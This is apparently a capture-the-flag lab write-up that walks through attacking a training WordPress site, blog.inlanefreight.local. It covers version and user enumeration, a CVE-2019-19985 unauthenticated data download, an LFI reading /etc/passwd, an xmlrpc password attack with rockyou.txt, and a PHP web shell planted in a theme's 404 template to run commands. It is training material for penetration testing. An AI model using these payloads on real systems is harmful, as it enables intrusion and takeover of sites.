# Hacking WordPress

### Scenario

You have been contracted to perform an external penetration test against the company `INLANEFREIGHT` that is hosting one of their main public-facing websites on WordPress.

Enumerate the target thoroughly using the skills learned in this module to find a variety of flags. Obtain shell access to the webserver to find the final flag.

First things first, make sure to configure your /etc/hosts.

#### Identify the WordPress version number.

```bash
curl -s -X GET http://blog.inlanefreight.local | grep '<meta name="generator"'
```

<figure><img src="../../.gitbook/assets/image (319).png" alt=""><figcaption></figcaption></figure>

Identify the WordPress theme in use.

{% code overflow="wrap" %}
```bash
curl -s -X GET http://blog.inlanefreight.local | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (320).png" alt=""><figcaption></figcaption></figure>

Submit the contents of the flag file in the directory with directory listing enabled.

I consider a manual approach, and manually open the /wp-includes and /wp-content directories.&#x20;

<figure><img src="../../.gitbook/assets/image (321).png" alt=""><figcaption></figcaption></figure>

Identify the only non-admin WordPress user. (Format: \<first-name> \<last-name>)

For this question I used wpscan and i successful enumerate 3 users

```bash
wpscan --url http://blog.inlanefreight.local --enumerate --api-token <API_STRING>
```

<figure><img src="../../.gitbook/assets/image (322).png" alt=""><figcaption></figcaption></figure>

Use a vulnerable plugin to download a file containing a flag value via an unauthenticated file download.

It took me a bit to find the exploit. The wpscan detected several vulnerable plugins, but none said something specific about _**unauthenticated file download**_.&#x20;

<figure><img src="../../.gitbook/assets/image (323).png" alt=""><figcaption></figcaption></figure>

But this line caught my attention and decided to open the highlighted URL above

<figure><img src="../../.gitbook/assets/image (324).png" alt=""><figcaption></figcaption></figure>

It has the CVE-2019-19985 mentioned. If you lookup on Google you'll find the exploit easilly.

{% code overflow="wrap" %}
```bash
curl 'http://blog.inlanefreight.local/wp-admin/admin.php?page=download_report&report=users&status=all'
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (325).png" alt=""><figcaption></figcaption></figure>

What is the version number of the plugin vulnerable to an LFI?

If you use wpscan, just look up for "LFI" :smile:

Use the LFI to identify a system user whose name starts with the letter "f".

You can find the reference exploit [here](https://www.exploit-db.com/exploits/44340).

{% code overflow="wrap" %}
```bash
http://blog.inlanefreight.local/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (326).png" alt=""><figcaption></figcaption></figure>

Obtain a shell on the system and submit the contents of the flag in the /home/erika directory

Start by finding the password for the user erika.

{% code overflow="wrap" %}
```bash
wpscan --password-attack xmlrpc -U erika -P rockyou.txt --url http://blog.inlanefreight.local
```
{% endcode %}

Authenticate with the password we just found.

<figure><img src="../../.gitbook/assets/image (327).png" alt=""><figcaption></figcaption></figure>

Then go to Appearence > Theme Editor.

<figure><img src="../../.gitbook/assets/image (328).png" alt=""><figcaption></figcaption></figure>

Then select Theme Seventeen > 404 Template > enter the PHP code like is showing on the image.

```php
<?php

system($_GET['cmd']);	
```

Then scroll to the bottom of the page and click on **Update File**.

We can test if its working with the following line:

{% code overflow="wrap" %}
```bash
curl -X GET "http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=id"

```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (329).png" alt=""><figcaption></figcaption></figure>

And it's working. Now we just have to go the erika's home directory.

{% code overflow="wrap" %}
```bash
curl -X GET "http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=cat%20/home/erika/d0ecaeee3a61e7dd23e0e5e4a67d603c_flag.txt"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (330).png" alt=""><figcaption></figcaption></figure>

And we got the last flag!
